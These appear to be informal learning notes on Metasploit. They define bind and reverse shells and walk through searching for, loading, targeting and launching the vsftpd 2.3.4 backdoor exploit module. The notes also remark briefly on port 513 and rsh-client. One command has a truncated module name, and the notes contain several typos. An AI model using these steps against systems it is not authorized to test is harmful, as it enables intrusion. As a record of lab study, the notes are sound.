# shell
- metasploit use two shell Bind & Reverse shell

# Bind shell
- when we have to connect the target system to directly connect on the targets remote port we use bind shell

# Reverse shell
- when our code execute on taregt and it connect back to our machine 

# f
- for example if we have the found a service we think it is valnerable and we want to find is there any exploit exixst for that 

msf > search vsftpd 2.3.4

Matching Modules
================

   #  Full Name                             Disclosure Date  Rank       Check  Name
   -  ---------                             ---------------  ----       -----  ----
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf > 

# to load that exploit
msf > use exploit/unix/ftp/vsftpd_234_backdoo

- now we just need to set the target ip
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS <TARGET-IP>

- for start the exploit
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit


# port 513 
this is the port use to connect remotly to any target for using this exploit we use 'rsh-client'


